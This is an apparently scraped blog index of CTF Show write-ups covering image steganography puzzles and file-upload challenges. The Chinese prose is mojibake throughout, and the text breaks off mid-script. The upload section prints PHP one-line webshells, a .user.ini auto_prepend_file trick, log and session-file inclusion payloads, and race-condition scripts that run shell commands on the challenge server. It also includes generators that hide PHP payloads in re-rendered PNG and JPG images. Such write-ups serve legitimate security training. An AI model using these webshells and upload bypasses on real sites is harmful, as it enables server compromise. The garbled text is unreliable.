flagè¢«è·³è¿‡å»äº† 1.16 misc 16 â€” flagåœ¨å›¾ç‰‡æ•°æ®é‡Œflagåœ¨å›¾ç‰‡æ•°æ®é‡Œã€‚ binwalk æå–æ–‡ä»¶ 1.17 misc 17 â€” flagåœ¨å›¾ç‰‡æ•°æ®é‡Œ â€” zstegflagåœ¨å›¾ç‰‡æ•°æ®é‡Œã€‚ zsteg å®‰è£… åŠ ä½¿ç”¨ zstegå¯ä»¥æ£€æµ‹PNGå’ŒBMPå›¾ç‰‡é‡Œçš„éšå†™æ•°æ®ã€‚ ç›®å‰ï¼Œzstegæ”¯æŒæ£€æµ‹ï¼š LSB steganography in PNG &amp; BMPzlib-compressed dataOpenStegoCamouflage 1.2.1LSB with The Eratosthenes set 1zsteg misc17.png 12zsteg -E &quot;extradata:0&quot; misc17.png &gt; 1.txtbinwalk -e 1.txt 1.18 misc 18 â€” flagåœ¨æ ‡é¢˜ã€ä½œè€…ã€ç…§ç›¸æœºå’Œé•œå¤´å‹å·é‡Œflagåœ¨æ ‡é¢˜ã€ä½œè€…ã€ç…§ç›¸æœºå’Œé•œå¤´å‹å·é‡Œã€‚ å³é”®å±æ€§æŸ¥çœ‹ 1.19 misc 19 â€” flagåœ¨ä¸»æœºä¸Šçš„æ–‡æ¡£åé‡Œ 1.20 misc 20 â€” flagåœ¨è¯„è®ºé‡Œå›¾è™«æŸ¥çœ‹å™¨ https://exif.tuchong.com/ ctfshow{c97964b1aecf06e1d79c21ddad593e42} 1.21 misc 21 â€” flagåœ¨åºå·é‡Œflagåœ¨åºå·é‡Œã€‚ 12print(hex(3902939465)+hex(2371618619)+hex(1082452817)+hex(2980145261))0xe8a221490x8d5c073b0x4084eb510xb1a1686d åˆ æ‰ 0x å³å¯ 1.22 misc22 â€” flag åœ¨å›¾ç‰‡é‡Œ â€” ç¼©ç•¥å›¾ â€” exiftool è®¾ç½®ä¸ºå¹³é“ºä¹‹åï¼Œå¯ä»¥ä¾ç¨€çœ‹å‡ºæ¥è¯¥å›¾ç‰‡ä¸‹æ–¹æœ‰ç€é»„è‰²çš„ä¸€è¡Œï¼Œä½†æ˜¯ç‚¹å‡»æŸ¥çœ‹ä¹‹ååˆçœ‹ä¸å‡ºæ¥ è¿™æ˜¯ä¸€ç§ç¼©ç•¥å›¾éšå†™çš„æ–¹å¼ï¼Œå«åšthumbnailéšå†™ exiftool 1exiftool.exe -ThumbnaiImage -b misc22.jpg &gt; 111.jpg ctfshow{dbf7d3f84b0125e833dfd3c80820a129} 1.23 misc23 â€” flagåœ¨æ—¶é—´é‡Œ â€”exiftool æŸ¥çœ‹å®è·µ 1exiftool.exe misc23.psd ctfshow{}, UnixTimestamp, DECtoHEX, getflag Unix æ—¶é—´æˆ³ï¼Œåè¿›åˆ¶åˆ°åå…­è¿›åˆ¶ï¼Œè·å– flag 1997:09:22 02:17:02+08:00 2055:07:15 12:14:48+08:00 2038:05:05 16:50:45+08:00 1984:08:03 18:41:46+08:00 åœ¨çº¿æ—¶é—´æˆ³è½¬æ¢ 874865822 2699237688 2156662245 460377706 12print(hex(874865822)+hex(2699237688)+hex(2156662245)+hex(460377706))0x3425649e0xa0e319380x808c0de50x1b70ce6a ctfshow{3425649ea0e31938808c0de51b70ce6a} 1.24 misc41ï¼ˆæœ¬é¢˜ä¸ºMiscå…¥é—¨å›¾ç‰‡ç¯‡å’Œæ„šäººèŠ‚æ¯”èµ›ç‰¹åˆ«è”åŠ¨é¢˜ï¼‰H4ppy Apr1l F001â€™s D4yï¼æ„šäººèŠ‚åˆ°äº†ï¼Œä¸€ç¾¤ç¬¨è›‹å¾€å—é£ï¼Œä¸€ä¼šå„¿æ’æˆSå­—ï¼Œä¸€ä¼šå„¿æ’æˆBå­—ã€‚ H4ppy Apr1l F001â€™s D4yï¼ è¿™æ˜¯ä¸ªæç¤ºï¼šF001ï¼Œ010 æœç´¢ F001ï¼Œå‘ç°å­˜åœ¨å¤§é‡ï¼Œç»„æˆäº†åˆºç›®çš„å½¢çŠ¶ï¼Œè¯»å–å‡ºæ¥å³å¯ ctfshow{fcbd427caf4a52f1147ab44346cd1cdd} 1.25 misc24 â€” flagåœ¨å›¾ç‰‡ä¸Šé¢ â€” bmp å›¾ç‰‡æ”¹é«˜åº¦bmp ä½å›¾æ–‡ä»¶è§£æ 900*150=135000ä¸ªåƒç´ å¤§å° è¯¥å›¾ç‰‡æ€»å…± 675056 ä¸ªå­—èŠ‚ï¼Œæ–‡ä»¶å°¾çš„ä½ç½®åœ¨675053å­—èŠ‚å¤„(åé¢ä¸¤ä¸ªå­—èŠ‚æ˜¯windowsçš„â€è¡¥0â€) æ–‡ä»¶å¤´å…± 53 å­—èŠ‚ æ¯ä¸ªåƒç´ ç‚¹ç”±3ä¸ªå­—èŠ‚ï¼ˆåå…­è¿›åˆ¶ç 6ä½ï¼‰è¡¨ç¤ºï¼Œæ¯ä¸ªå­—èŠ‚è´Ÿè´£æ§åˆ¶ä¸€ç§é¢œè‰²ï¼Œåˆ†åˆ«ä¸ºè“ï¼ˆBlueï¼‰ã€ç»¿ï¼ˆGreenï¼‰ã€çº¢ï¼ˆRedï¼‰ (675053-53)/3=225000 å¾—åˆ°çœŸå®çš„åƒç´ å¤§å° è¯¥é¢˜åªæœ‰é«˜ä¸å¯¹ï¼Œåˆ™æ­£ç¡®çš„å®½ä¾æ—§æ˜¯ 900 å¾—åˆ° 225000/900=é«˜ 250 ä¿®æ”¹é«˜ä¸º hex(250)=FA è¿˜æ˜¯ 0096 çš„ä½ç½®ä¿®æ”¹ ä¿å­˜å¾—åˆ°flag 1.26 misc25 â€” flagåœ¨å›¾ç‰‡ä¸‹é¢ â€” png å›¾ç‰‡æ”¹é«˜åº¦ 0096 æ”¹æˆ 0196 0296 éƒ½å¯ 1.27 misc26 â€” flagè¿˜æ˜¯åœ¨å›¾ç‰‡ä¸‹é¢ï¼Œä½†åˆ°åº•æœ‰å¤šä¸‹é¢ï¼Ÿ ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} https://blog.csdn.net/weixin_44145452/article/details/109612189 ä¼šæç¤ºæ ¡éªŒç é”™è¯¯ CRC32æ˜¯æœ‰å“ªäº›å­—èŠ‚æ„æˆçš„ï¼Ÿ PNGæ–‡ä»¶ä¸­æ€»æ˜¯ä»¥å›ºå®šçš„å…«ä¸ªå­—èŠ‚å¼€å¤´ 89 50 4E 47 0D 0A 1A 0A æ•°æ®å—é•¿åº¦3 00 00 00 0D æ–‡ä»¶å¤´æ•°æ®å—æ ‡ç¤ºIDCH 49 48 44 52 13ä½æ•°æ®å—ï¼ˆIHDRï¼‰ä¸‹é¢ä¸ºå®½å’Œé«˜ 00 00 07 7E 00 00 03 60 è¿™5ä¸ªå­—èŠ‚ä¾æ¬¡ä¸ºBit depthï¼ŒColorTypeï¼ŒCompression methodï¼ŒFilter methodï¼ŒInterlace method 08 06 00 00 00 æ¥ä¸‹æ¥çš„å››å­—èŠ‚ä¸ºè¯¥pngå›¾ç‰‡çš„CRCæ ¡éªŒç  7D C7 3F 7F CRCæ ¡éªŒç ï¼Œç”±IDCHå’ŒIHDRå…±åä¸ƒä½å­—èŠ‚è¿›è¡Œcrcè®¡ç®—å¾—åˆ° è§£å†³æ–¹æ³•ï¼š1.ç®€å•ç‚¹çš„éšå†™é¢˜ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹å®½é«˜ï¼Œç„¶åæ˜¾ç¤ºflag2.é‚£ä¹ˆå¦‚æœä¿®æ”¹å®½é«˜ï¼Œå¹¶ä¸ä¼šç›´æ¥çœ‹åˆ°flagï¼Œéœ€è¦æ”¾å…¥stegsolveé‡Œæˆ–è€…åšå…¶å®ƒçš„è¿›ä¸€æ­¥å¤„ç†æ—¶ã€‚è¿™é‡Œä¼šäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ä¿®æ”¹è¿‡å®½é«˜çš„å›¾ç‰‡stegsolveæ— æ³•æ‰“å¼€ï¼Œæç¤ºIOé”™è¯¯ã€‚è¿™æ˜¯å› ä¸ºpngå›¾åƒçš„IHDRæ®µä¸­çš„é«˜å®½è¢«ä¿®æ”¹ï¼Œå¯¼è‡´è®¡ç®—å‡ºæ¥çš„CRCä¸æ­£ç¡®ï¼Œæ‰€ä»¥æ— æ³•æ­£ç¡®è¯»å–ã€‚é€šè¿‡python2è„šæœ¬æ¥è·å–å›¾ç‰‡é«˜åº¦ è·å–å›¾ç‰‡é«˜åº¦ 1234567891011# -*- coding: utf-8 -*-import binasciiimport structcrc32key = 0x7DC73F7Ffor i in range(0, 65535): height = struct.pack(&#x27;&gt;i&#x27;, i) #CRC: 7DC73F7F data = &#x27;\\x49\\x48\\x44\\x52\\x00\\x00\\x07\\x7E&#x27; + height + &#x27;\\x08\\x06\\x00\\x00\\x00&#x27; crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print &#x27;&#x27;.join(map(lambda c: &quot;%02X&quot; % ord(c), height)) çˆ†ç ´å›¾ç‰‡æ­£å¸¸å®½é«˜ 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #æ–‡ä»¶å¤´æ•°æ®å—æ ‡ç¤ºIDCHstr2=&quot;0806000000&quot; #äº”å­—èŠ‚ï¼šBit depthï¼ŒColorTypeï¼ŒCompression methodï¼ŒFilter methodï¼ŒInterlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #å®½é«˜ åƒç´ crc32 = &quot;0xec9ccbc6&quot; #æ ¡éªŒç for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} 1ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125; 1.28 misc27 â€” flagåœ¨å›¾ç‰‡ä¸‹é¢ å¯»æ‰¾ 0096 1.29 misc28 â€” flagåœ¨å›¾ç‰‡ä¸‹é¢ â€” gif9600 æ›´æ”¹ä¸º FF00ï¼Œä¸¤å¤„ gif.bt ??????? 1.30 misc29 â€” flagåœ¨å›¾ç‰‡ä¸‹é¢9600 æ›´æ”¹ä¸º FF00ï¼Œåå¤„ï¼Œç„¶å stegsolve é€å¸§æŸ¥çœ‹ 1.31 misc30 â€” æ­£ç¡®çš„å®½åº¦æ˜¯950ä¿®æ”¹ bmp å®½åº¦ä¸º hex(950) 1.32 misc31 â€” é«˜åº¦æ˜¯æ­£ç¡®çš„ï¼Œä½†æ­£ç¡®çš„å®½åº¦æ˜¯å¤šå°‘å‘¢åŒ misc24 å›¾ç‰‡æ€»å…± 487256 å­—èŠ‚ï¼Œå»æ‰æ–‡ä»¶å°¾ï¼Œå¾—åˆ° 487253 900*150=135000 æ–‡ä»¶å¤´ 53 å­—èŠ‚ (487253-53)/3=162400 é«˜æ­£ç¡®ï¼Œ150 å®½ï¼š162400/150=1082.67 æ”¹å®½ä¸º 1082 1.33 misc32 â€” é«˜åº¦æ˜¯æ­£ç¡®çš„ï¼Œä½†æ­£ç¡®çš„å®½åº¦æ˜¯å¤šå°‘å‘¢png è®¡ç®—å®½é«˜ 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #æ–‡ä»¶å¤´æ•°æ®å—æ ‡ç¤ºIDCHstr2=&quot;0802000000&quot; #äº”å­—èŠ‚ï¼šBit depthï¼ŒColorTypeï¼ŒCompression methodï¼ŒFilter methodï¼ŒInterlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #å®½é«˜ åƒç´ crc32 = &quot;0xe14a4c0b&quot; #æ ¡éªŒç for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) 0x414 0x96 1.34 misc33 â€” å‡ºé¢˜äººä¸§å¿ƒç—…ç‹‚ï¼ŒæŠŠé«˜åº¦ä¹Ÿæ”¹äº†1import zlibimport struct# åŒæ—¶çˆ†ç ´å®½åº¦å’Œé«˜åº¦filename = &quot;misc33.png&quot;with open(filename, &#x27;rb&#x27;) as f: all_b = f.read() data = bytearray(all_b[12:29]) n = 4095 for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) #æ›¿æ¢æˆå›¾ç‰‡çš„crc if crc32result == 0x5255a798: print(&quot;å®½ä¸ºï¼š&quot;, end = &#x27;&#x27;) print(width, end = &#x27; &#x27;) print(int.from_bytes(width, byteorder=&#x27;big&#x27;)) print(&quot;é«˜ä¸ºï¼š&quot;, end = &#x27;&#x27;) print(height, end = &#x27; &#x27;) print(int.from_bytes(height, byteorder=&#x27;big&#x27;)) å®½ä¸ºï¼šbytearray(bâ€™\\x00\\x00\\x03\\xd2â€™) 978é«˜ä¸ºï¼šbytearray(bâ€™\\x00\\x00\\x00\\x8eâ€™) 142 1.35 misc34 â€” å‡ºé¢˜äººç‹—æ€¥è·³å¢™ï¼ŒæŠŠIHDRå—çš„CRCä¹Ÿæ”¹äº†ï¼Œä½†æˆ‘ä»¬çŸ¥é“æ­£ç¡®å®½åº¦è‚¯å®šå¤§äº9001.36 misc351.37 misc361.38 misc37 â€” flagåœ¨å›¾ç‰‡é‡ŒStegSolve å¸§å›¾åˆ†æ ctfshow{2056782cd57b13261dcbbe3d6eecda17} 1.39 misc38 â€” flagåœ¨å›¾ç‰‡é‡Œ ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œå³å¯å‘ç°ä¼šåŠ¨ APNG å›¾ç‰‡åˆ†è§£å™¨ ctfshow{48b722b570c603ef58cc0b83bbf7680d} 1.40 misc39 â€” flagå°±åƒæ°´ï¼Œå¿½å¿«å¿½æ…¢åœ°æµè¿™é¢˜ä¹Ÿæ˜¯ä¸€ä¸ªgifï¼Œä¸è¿‡è¿™é‡Œæ˜¯åˆ©ç”¨ä¸åŒå¸§ä¹‹é—´çš„é—´éš”æ—¶é—´æ¥éšå†™çš„ã€‚ 1.41 misc40 â€” flagå°±åƒæ­Œï¼Œæœ‰é•¿æœ‰çŸ­ä»¿ä½›å²æœˆæ‚ æ‚ apng å¸§åˆ†ç¦»ï¼Œæ¢æˆäº†apngçš„å¸§æ—¶é—´é—´éš”éšå†™ 1flag=&quot;&quot;for i in range(28,69): #flagå†…å®¹ä»28ä½å¼€å§‹ f = open(&#x27;apngframe&#x27;+str(i)+&#x27;.txt&#x27;) s = f.read() flag += chr(int(s.split(&quot;/&quot;)[0][6:]))print(flag)","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-æ–‡ä»¶ä¸Šä¼ ","slug":"CTF-Show-æ–‡ä»¶ä¸Šä¼ ","date":"2021-10-01T11:16:29.000Z","updated":"2021-10-01T11:17:15.184Z","comments":true,"path":"2021/10/01/CTF-Show-æ–‡ä»¶ä¸Šä¼ /","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"CTF Show æ–‡ä»¶ä¸Šä¼ ç¯‡ã€‚","text":"CTF Show æ–‡ä»¶ä¸Šä¼ ç¯‡ã€‚ CTF Show â€” æ–‡ä»¶ä¸Šä¼ 1.1 Web 151 â€” å‰ç«¯éªŒè¯ æ‰‹åŠ¨åˆ é™¤å‰ç«¯éªŒè¯ï¼Œå¥½åƒæ²¡ä»€ä¹ˆä½œç”¨ï¼Œå°è¯•ä¹‹åå‘ç°ï¼Œåªèƒ½æˆåŠŸä¸Šä¼  .png å›¾ç‰‡ï¼Œå…¶å®æŸ¥çœ‹æºä»£ç åæœ‰ æ‰€ä»¥åªèƒ½ä¸Šä¼  .png ï¼Œæˆ‘ä»¬ä¸Šä¼  1.png ç„¶åæŠ“åŒ…æ‰‹åŠ¨ä¿®æ”¹ èšå‰‘è¿æ¥å³å¯ 1.2 Web 1521åç«¯ä¸èƒ½å•ä¸€æ ¡éªŒ åŒä¸Š 1.3 Web 153 â€” .user.iniç”±äºæœåŠ¡å™¨æ˜¯ nginx ï¼Œåˆ™å¯å°è¯•ä¸Šä¼  .user.ini å†ä¸Šä¼  111.png è®¿é—®ä¸ 111.png åŒç›®å½•ä¸‹çš„ index.php æ–‡ä»¶ å³ /upload/index.php ï¼Œä½¿ç”¨ èšå‰‘è¿æ¥å³å¯ 1.4 Web 154 â€” å¤§å°å†™ç»•è¿‡ phpè¿™æ¬¡å°è¯•ä¹‹åå‘ç°è¿›è¡Œäº†å†…å®¹åˆ¤æ–­ï¼Œåªèƒ½ä½¿ç”¨å›¾ç‰‡æœ¨é©¬ å‘ç° .user.ini ä»æ—§å¯ä»¥ä¸Šä¼  ä½†æ˜¯å†…å®¹è¿‡æ»¤äº† php ,æƒ³åŠæ³•æ‰¾ä¸€äº›ä¸å«æœ‰ php çš„ä¸€å¥è¯ 1234567891011121314151617181920212223241:XMLé£æ ¼ï¼Œä¹Ÿæ˜¯å®˜æ–¹æ¨èçš„å½¢å¼&lt;?php @eval($_POST[1]);?&gt; 2:çŸ­æ ‡è®°&lt;? @eval($_POST[1]);?&gt;éœ€è¦å¼€å¯é…ç½®å‚æ•°short_open_tags=on&lt;?= @eval($_POST[1]);è‡ª PHP 5.4 èµ·ï¼ŒçŸ­æ ¼å¼çš„ echo æ ‡è®° &lt;?= æ€»ä¼šè¢«è¯†åˆ«å¹¶ä¸”åˆæ³•ï¼Œè€Œä¸ç®¡ short_open_tag çš„è®¾ç½®æ˜¯ä»€ä¹ˆã€‚&lt;? echo &#x27;123&#x27;;?&gt; //short_open_tags=on&lt;?=(è¡¨è¾¾å¼)?&gt; ç­‰ä»·äº &lt;?php echo (è¡¨è¾¾å¼)?&gt; //æ— é™åˆ¶3:ASPé£æ ¼&lt;% @eval($_POST[1]); %&gt; ASPé£æ ¼æ ‡è®°ä»…åœ¨é€šè¿‡php.inié…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤asp_tagsæ‰“å¼€åæ‰å¯ç”¨ã€‚&lt;% echo &#x27;123&#x27;;%&gt; //asp_tags=on php_version &lt; 74:è„šæœ¬é£æ ¼&lt;script language=&quot;php&quot;&gt; echo &quot;666&quot;;&lt;/script&gt; PHP 7.0.0ä»¥åå¤±æ•ˆ æœ¬é¢˜å‘ç°å¯ä»¥å¤§å°å†™è¿›è¡Œç»•è¿‡ èšå‰‘æ˜¾ç¤ºä¸å‡ºå…·ä½“æ–‡ä»¶æ—¶ï¼Œå°è¯•è¿›è¡Œç»ˆç«¯æŸ¥çœ‹ 1# è¿‡æ»¤äº† phpï¼Œæ²¡è¿‡æ»¤å¤§å°å†™ 1.5 Web 155 â€” çŸ­æ ‡ç­¾ç»•è¿‡ php1# è¿‡æ»¤äº† phpï¼Œè¿‡æ»¤äº†å¤§å°å†™ åŒä¸Š å¯ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ php 1.6 Web 156 â€” { } ä»£æ›¿ [ ]1# è¿‡æ»¤äº† phpï¼Œå¤§å°å†™ï¼Œ[]ç¬¦å· ä¹‹ååŒä¸Š 1.7 Web 157-159 â€” å‘½ä»¤æ‰§è¡Œ1# è¿‡æ»¤äº† phpï¼Œå¤§å°å†™ï¼Œ[]ï¼Œ&#123;&#125;ï¼Œ; è½¬æ¢æ€è·¯ï¼Œä¸ä¸Šä¼ ä¸€å¥è¯äº†ï¼Œç›´æ¥ å‘½ä»¤æ‰§è¡Œ 12345&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; 1.8 Web 160 â€” æ—¥å¿—åŒ…å«ï¼ˆè¿‡æ»¤ logï¼‰1# è¿‡æ»¤äº† phpï¼Œå¤§å°å†™ï¼Œ[]ï¼Œ;ï¼Œ``ï¼Œlog æ—¥å¿—åŒ…å« æ¡ä»¶ çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯» 1# ä¸Šä¼  .user.iniauto_prepend_file=123.png# ä¸Šä¼  123.png# nginx æœåŠ¡å™¨&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# ç”±äº log è¢«è¿‡æ»¤ï¼Œè¿›è¡Œæ‹¼æ¥&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt; å°† .user.ini å’Œ 123.png éƒ½æˆåŠŸä¸Šä¼ ä¹‹åï¼Œè®¿é—® /upload/index.php æŠ“åŒ…åœ¨ User-Agent ä¸­æ·»å…¥ä»£ç ï¼Œè®¿é—®å³å¯ 1&lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; æµç¨‹ è®¿é—® /upload/index.php ç”±äº .user.ini çš„é…ç½®ï¼Œå°†é¦–å…ˆè‡ªåŠ¨åŒ…å«æ–‡ä»¶ 123.png ç”±äºæ˜¯ åŒ…å« æ–‡ä»¶ 123.png ï¼Œå°†ä¼šè‡ªåŠ¨æ‰§è¡Œå…¶ä¸­çš„ä»£ç  å³åŒ…å« /var/log/nginx/access.log æ—¥å¿—æ–‡ä»¶ è€Œæˆ‘ä»¬å†åœ¨æ—¥å¿—æ–‡ä»¶å½“ä¸­å†™å…¥ æ¶æ„ä»£ç ï¼Œå°±å°†ä¼šè¢«æ‰§è¡Œ 1.9 Web 161 â€” æ–‡ä»¶å¤´ GIF89a å†™å…¥æ— æ³•ä¸Šä¼  .user.ini éªŒè¯äº†å›¾ç‰‡å†…å®¹ï¼Œå³å¿…é¡»åŒ…å«æ–‡ä»¶å¤´ åœ¨ Web 160 çš„åŸºç¡€ä¸Šæ·»åŠ  æ–‡ä»¶å¤´ GIF89a æˆ–è€…æ˜¯ PNG å›¾ç‰‡çš„ æ–‡ä»¶å¹»æœ¯ 1.10 Web 162-163 â€” session æ–‡ä»¶åŒ…å«ç»§ç»­ä½¿ç”¨ä¸Šè¿° æ—¥å¿— åŒ…å«ï¼Œå‘ç°ä¸Šä¼  .user.ini æ—¶ï¼Œæ–‡ä»¶å†…å®¹ è¿‡æ»¤æ‰äº† . è¿‡æ»¤æ‰äº† . session åŒ…å« 1# ä¸Šä¼  .user.iniGIF89aauto_prepend_file=test 1# ä¸Šä¼  testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt; æ„é€  POST æ•°æ®åŒ… 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; ä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹ï¼Œå†™å…¥ä»£ç ï¼Œè¿›è¡Œçˆ†ç ´ ç„¶åè®¿é—® /upload/index.php é¡µé¢è¿›è¡ŒæŠ“åŒ…ï¼Œçˆ†ç ´ ä»¥ä¸Šä¸¤ä¸ªåŒ…åŒæ—¶è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ° flag æµç¨‹ ä¸Šä¼  .user.ini ä¸Šä¼  test è®¿é—® /upload/index.php ï¼Œç”±äº .user.ini çš„é…ç½®ï¼Œé¦–å…ˆåŒ…å« test æ–‡ä»¶ï¼Œç´§æ¥ç€æ‰§è¡Œå…¶ä¸­ä»£ç ï¼Œå³åŒ…å« /tmp/sess_test åŒ…å« sess_test ï¼Œå³æ‰§è¡Œå…¶ä¸­çš„ php ä»£ç ï¼Œå³æ˜¾ç¤ºå‡º flag.php 1# è„šæœ¬# coding=utf-8import ioimport requestsimport threadingsessID = &#x27;test&#x27;url = &#x27;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&#x27;def write(session): while event.isSet(): f = io.BytesIO(b&#x27;a&#x27; * 256 * 1) response = session.post( url, cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125; )def read(session): while event.isSet(): response = session.get(url + &#x27;upload/index.php&#x27;.format(sessID)) if &#x27;flag&#x27; in response.text: print(response.text) event.clear() else: print(&#x27;[*]retrying...&#x27;)if __name__ == &#x27;__main__&#x27;: event = threading.Event() event.set() with requests.session() as session: for i in range(1, 30): threading.Thread(target=write, args=(session,)).start() for i in range(1, 30): threading.Thread(target=read, args=(session,)).start() 1# æ¡ä»¶ç«äº‰# coding=utf-8import requestsimport threadingsession=requests.session()sess=&#x27;test&#x27;url1=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&quot;url2=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/upload&quot;data1=&#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file=&#123; &#x27;file&#x27;:&#x27;test&#x27;&#125;cookies=&#123; &#x27;PHPSESSID&#x27;: sess&#125;def write(): while True: r = session.post(url1,data=data1,files=file,cookies=cookies)def read(): while True: r = session.get(url2) if &#x27;flag&#x27; in r.text: print(r.text) threads = [threading.Thread(target=write), threading.Thread(target=read)]for t in threads: t.start() 1.11 Web 164 â€” png äºŒæ¬¡æ¸²æŸ“1&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;1.png&#x27;);?&gt; ç»“æœç”Ÿæˆ 1.png ï¼Œå…¶ä¸­åŒ…å« &lt;?=$_GET[0]($_POST[1]);?&gt; ç„¶åè®¿é—®å›¾ç‰‡ï¼Œæ‰§è¡Œä»£ç åï¼Œä¸‹è½½å›¾ç‰‡æŸ¥çœ‹ å› ä¸ºåœ¨ä¸‹è½½çš„æ—¶å€™ï¼Œçœ‹åˆ° url æ˜¯ download/?image= ï¼Œå¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ 1.12 Web 165 â€” jpg äºŒæ¬¡æ¸²æŸ“ é¦–å…ˆå‡†å¤‡ä¸€å¼  jpg å›¾ç‰‡ä¸Šä¼ ï¼ŒæˆåŠŸåä¸‹è½½å›æ¥ï¼Œä½¿ç”¨å¦‚ä¸‹è„šæœ¬å¤„ç†ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å›¾ç‰‡é©¬ï¼Œå†æ¬¡ä¸Šä¼  æŸ¥çœ‹ï¼Œå³æ–‡ä»¶åŒ…å«ï¼Œä¿å­˜åˆ°æœ¬åœ°æ‰“å¼€å³å¯ 1&lt;?php $miniPayload = &quot;&lt;?=`tac f*`?&gt;&quot;; //è¿™é‡Œæ”¹ä»£ç  if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = 